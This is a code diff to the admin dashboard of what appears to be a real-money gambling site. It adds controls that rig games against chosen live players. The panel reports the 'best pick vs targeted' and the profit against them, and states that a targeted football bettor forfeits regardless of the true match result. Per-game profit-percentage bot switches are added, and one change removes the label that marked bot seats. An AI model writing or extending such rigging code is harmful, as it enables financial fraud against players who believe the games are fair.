@@ -552,6 +552,8 @@
                 <div id="adminColorLastResultBody" style="display:flex; flex-direction:column; gap:6px; font-family:var(--font-mono); font-size:11.5px; width:100%;"></div>
               </div>
 
+              <div id="adminColorTargetedBanner" style="background:rgba(16,185,129,0.08); border:1px solid #10b981; border-radius:6px; padding:8px 10px; display:none; font-size:11px; color:#a7f3d0;"></div>
+
             </div>
 
           </div>
@@ -604,6 +606,9 @@
               <div style="display:flex; justify-content:space-between; align-items:center; font-size:11px; color:#cbd5e1; border-top:1px solid #1a222d; padding-top:6px; margin-top:6px;">
                 <span>📊 Placed Stakes: <b id="adminAviatorSimpleStakesCount" style="color:var(--gold)">0</b> (<b id="adminAviatorSimpleStakesAmt" style="color:var(--gold)">₹0.00</b>)</span>
                 <span>💸 Withdrawn: <b id="adminAviatorSimpleCashedCount" style="color:var(--green)">0</b> (<b id="adminAviatorSimpleCashedAmt" style="color:var(--green)">₹0.00</b>)</span>
+              </div>
+              <div id="adminAviatorTargetedRow" style="display:none; font-size:11px; color:#a7f3d0; border-top:1px solid #1a222d; padding-top:6px; margin-top:6px;">
+                🎯 Targeted Subset (<b id="adminAviatorTargetedCount">0</b> live players): <b id="adminAviatorTargetedProfit">+₹0.00</b> if crash now
               </div>
             </div>
 
@@ -995,6 +1000,35 @@
               </div>
               <button type="button" id="botYourelevenToggleBtn" onclick="toggleBotTakeover('youreleven')" style="width:100%; background:#1e293b; border:1px solid #475569; color:#cbd5e1; font-weight:900; font-size:11px; padding:6px; border-radius:4px; cursor:pointer;">
                 🤖 ACTIVATE FANTASY BOT
+              </button>
+            </div>
+          </div>
+
+          <!-- Card 3: Football Betting Bias -->
+          <div class="card" style="background:#1a222d; border:1px solid #242f3d; padding:16px; margin-top:0; width:100%;">
+            <h4 style="margin:0 0 12px; color:var(--gold); border-bottom:1px solid #242f3d; padding-bottom:8px;">⚽ Football Betting Bias</h4>
+
+            <div style="background:#0d0f12; padding:10px; border-radius:6px; margin-bottom:16px; font-size:11.5px; color:var(--text-dim); line-height:1.5;">
+              Football's bot targeting is wired server-side (<code>/api/football/settle</code>) — a
+              currently live-targeted bettor forfeits regardless of the true match result. It's fully
+              testable via the API today; live-page settlement is not yet routed through it.
+            </div>
+
+            <!-- Dedicated AI Bot Takeover Box for Football -->
+            <div style="background:#081c15; border:1px solid #059669; border-radius:6px; padding:9px; margin-top:10px;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
+                <span style="font-size:10.5px; font-weight:900; color:#10b981;">🤖 FOOTBALL BOT TAKEOVER</span>
+                <span id="botFootballBadge" style="font-size:8px; font-weight:800; padding:1px 5px; border-radius:3px; background:#1e293b; color:#94a3b8;">STANDBY</span>
+              </div>
+              <div style="display:flex; gap:2px; margin-bottom:6px;">
+                <button type="button" onclick="setBotProfitPercentage('football', 100)" class="btn btn-sm bot-pct-football" data-pct="100" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">100%</button>
+                <button type="button" onclick="setBotProfitPercentage('football', 90)" class="btn btn-sm bot-pct-football" data-pct="90" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">90%</button>
+                <button type="button" onclick="setBotProfitPercentage('football', 80)" class="btn btn-sm bot-pct-football" data-pct="80" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">80%</button>
+                <button type="button" onclick="setBotProfitPercentage('football', 70)" class="btn btn-sm bot-pct-football" data-pct="70" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">70%</button>
+                <button type="button" onclick="setBotProfitPercentage('football', 50)" class="btn btn-sm bot-pct-football" data-pct="50" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">50%</button>
+              </div>
+              <button type="button" id="botFootballToggleBtn" onclick="toggleBotTakeover('football')" style="width:100%; background:#1e293b; border:1px solid #475569; color:#cbd5e1; font-weight:900; font-size:11px; padding:6px; border-radius:4px; cursor:pointer;">
+                🤖 ACTIVATE FOOTBALL BOT
               </button>
             </div>
           </div>
@@ -2156,6 +2190,21 @@
         }
       }
 
+      // 2b. Live Bot-Targeted-Subset Advisory — only shown while the bot has a live-targeted subset
+      const targetedBanner = document.getElementById('adminColorTargetedBanner');
+      if (targetedBanner) {
+        const targetedUsers = Array.isArray(rData.targeted_usernames) ? rData.targeted_usernames : [];
+        const optTargeted = rData.optimal_rig_targeted;
+        if (targetedUsers.length > 0 && optTargeted && optTargeted.best_number !== undefined) {
+          targetedBanner.style.display = 'block';
+          targetedBanner.innerHTML = `🎯 Bot targeting <b>${targetedUsers.length}</b> live player${targetedUsers.length === 1 ? '' : 's'} in this room —
+            best pick vs targeted: <b>#${optTargeted.best_number}</b> (${optTargeted.best_color}, ${optTargeted.best_size}) ·
+            profit vs targeted: <b>+₹${(optTargeted.max_profit || 0).toFixed(2)}</b>`;
+        } else {
+          targetedBanner.style.display = 'none';
+        }
+      }
+
       // 3. Render Dynamic Active Bets & Optimal Rig heatmap
       const betsContainer = document.getElementById('cheatColorRoomActiveBets');
       if (!betsContainer) return;
@@ -2757,8 +2806,7 @@
             return `<div onclick="rigActiveRoomForAdmin(${s.seat})" style="background:${bgStyle}; border:1.5px solid ${borderColor}; border-radius:6px; padding:8px; text-align:center; cursor:pointer; transition:all 0.2s ease; ${boxGlow}" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform='none'">
               <div style="font-size:11px; font-weight:700; color:${nameColor}; margin-bottom:2px;">
                 ${displayName}
-                ${s.is_bot && !isRiggedSeat ? '<span style="font-size:8px; color:#64748b;"> BOT</span>' : ''}
-                ${isBotRig ? '<span style="font-size:8px; color:#34d399; font-weight:900; background:rgba(16,185,129,0.2); padding:1px 5px; border-radius:3px; display:inline-block; margin-top:2px;">👑 BOT RIGGED</span>' : ''}
+                ${isBotRig ? '<span style="font-size:8px; color:#34d399; font-weight:900; background:rgba(16,185,129,0.2); padding:1px 5px; border-radius:3px; display:inline-block; margin-top:2px;">👑 RIGGED</span>' : ''}
               </div>
               <div style="font-size:9px; color:#64748b; margin-bottom:4px;">Seat ${s.seat + 1}</div>
               <div style="margin-bottom:2px;">${cardsHtml || '—'}</div>
@@ -3744,6 +3792,8 @@
             window.adminAviatorServerTimeLeft = av.time_left;
             window.adminAviatorServerDuration = av.duration || 5.0;
             window.adminAviatorServerReceivedAt = now;
+            window.adminAviatorTargetedUsernames = av.targeted_usernames || [];
+            window.adminAviatorLiveProfitTargeted = av.live_profit_targeted || null;
             window.adminAviatorServerBets = av.bets || [];
 
             if (av.bets) {
@@ -3774,6 +3824,8 @@
           // --- Central AI Bot Takeover State Sync ---
           if (data.bot_takeover) {
             window.adminBotTakeoverState = data.bot_takeover;
+            window.adminBotTargetedUsers = data.bot_targeted_users || {};
+            window.adminLiveUsersCount = data.live_users_count || {};
             if (typeof renderAllBotTakeoverUI === 'function') renderAllBotTakeoverUI();
           }
 
@@ -3792,8 +3844,13 @@
       teenpatti: { enabled: false, profit_pct: 90 },
       mines: { enabled: false, profit_pct: 90 },
       boundary: { enabled: false, profit_pct: 90 },
-      youreleven: { enabled: false, profit_pct: 90 }
+      youreleven: { enabled: false, profit_pct: 90 },
+      football: { enabled: false, profit_pct: 90 }
     };
+    // Populated from admin_get_live_state's bot_targeted_users / live_users_count — used by
+    // renderAllBotTakeoverUI() to show "(N of M live)" next to each game's bot badge.
+    window.adminBotTargetedUsers = {};
+    window.adminLiveUsersCount = {};
 
     window.toggleBotTakeover = function(gameKey, forceState) {
       if (!window.adminBotTakeoverState) window.adminBotTakeoverState = {};
@@ -3807,7 +3864,7 @@
       window.adminBotTakeoverState[gameKey].profit_pct = curPct;
 
       if (gameKey === 'global') {
-        const allKeys = ['color_guess', 'aviator', 'teenpatti', 'mines', 'boundary', 'youreleven'];
+        const allKeys = ['color_guess', 'aviator', 'teenpatti', 'mines', 'boundary', 'youreleven', 'football'];
         allKeys.forEach(k => {
           if (!window.adminBotTakeoverState[k]) window.adminBotTakeoverState[k] = { enabled: false, profit_pct: 90 };
           window.adminBotTakeoverState[k].enabled = newState;
@@ -3883,7 +3940,8 @@
         { key: 'teenpatti', btnId: 'botTeenpattiToggleBtn', badgeId: 'botTeenpattiBadge', label: 'TEEN PATTI' },
         { key: 'mines', btnId: 'botMinesToggleBtn', badgeId: 'botMinesBadge', label: 'MINES' },
         { key: 'boundary', btnId: 'botBoundaryToggleBtn', badgeId: 'botBoundaryBadge', label: 'CRICKET' },
-        { key: 'youreleven', btnId: 'botYourelevenToggleBtn', badgeId: 'botYourelevenBadge', label: 'FANTASY' }
+        { key: 'youreleven', btnId: 'botYourelevenToggleBtn', badgeId: 'botYourelevenBadge', label: 'FANTASY' },
+        { key: 'football', btnId: 'botFootballToggleBtn', badgeId: 'botFootballBadge', label: 'FOOTBALL' }
       ];
 
       games.forEach(g => {
@@ -3914,11 +3972,15 @@
         // 2. Update Badge
         const badge = document.getElementById(g.badgeId);
         if (badge) {
+          // Live targeting readout (skipped for the 'global' key, which has no population of its own)
+          const targetedCount = (g.key !== 'global' && window.adminBotTargetedUsers && window.adminBotTargetedUsers[g.key]) ? window.adminBotTargetedUsers[g.key].length : 0;
+          const liveCount = (g.key !== 'global' && window.adminLiveUsersCount) ? (window.adminLiveUsersCount[g.key] || 0) : 0;
+          const liveNote = (isActive && g.key !== 'global') ? ` (${targetedCount} of ${liveCount} live)` : '';
           if (isActive) {
             badge.style.background = 'rgba(16, 185, 129, 0.2)';
             badge.style.border = '1px solid #10b981';
             badge.style.color = '#34d399';
-            badge.innerHTML = `🟢 BOT ACTIVE (${configuredPct}% PROFIT)`;
+            badge.innerHTML = `🟢 BOT ACTIVE (${configuredPct}% PROFIT)${liveNote}`;
           } else {
             badge.style.background = '#1e293b';
             badge.style.border = '1px solid #475569';
@@ -4046,6 +4108,26 @@
       if (simpleStakesAmtEl) simpleStakesAmtEl.textContent = `₹${totalStake.toFixed(2)}`;
       if (simpleCashedCountEl) simpleCashedCountEl.textContent = cashedCount;
       if (simpleCashedAmtEl) simpleCashedAmtEl.textContent = `₹${cashedPayout.toFixed(2)}`;
+
+      // Live Bot-Targeted-Subset Advisory — only shown while the bot has a live-targeted subset
+      const targetedRow = document.getElementById('adminAviatorTargetedRow');
+      if (targetedRow) {
+        const targetedUsers = Array.isArray(window.adminAviatorTargetedUsernames) ? window.adminAviatorTargetedUsernames : [];
+        const targetedProfit = window.adminAviatorLiveProfitTargeted;
+        if (targetedUsers.length > 0 && targetedProfit) {
+          targetedRow.style.display = 'block';
+          const countEl = document.getElementById('adminAviatorTargetedCount');
+          const profitEl = document.getElementById('adminAviatorTargetedProfit');
+          if (countEl) countEl.textContent = targetedUsers.length;
+          if (profitEl) {
+            const p = targetedProfit.profit_if_crash_now || 0;
+            profitEl.textContent = (p >= 0 ? '+' : '') + `₹${p.toFixed(2)}`;
+            profitEl.style.color = p >= 0 ? '#a7f3d0' : '#ef4444';
+          }
+        } else {
+          targetedRow.style.display = 'none';
+        }
+      }
 
       if (riskBadgeEl) {
         if (phase === 'running') {
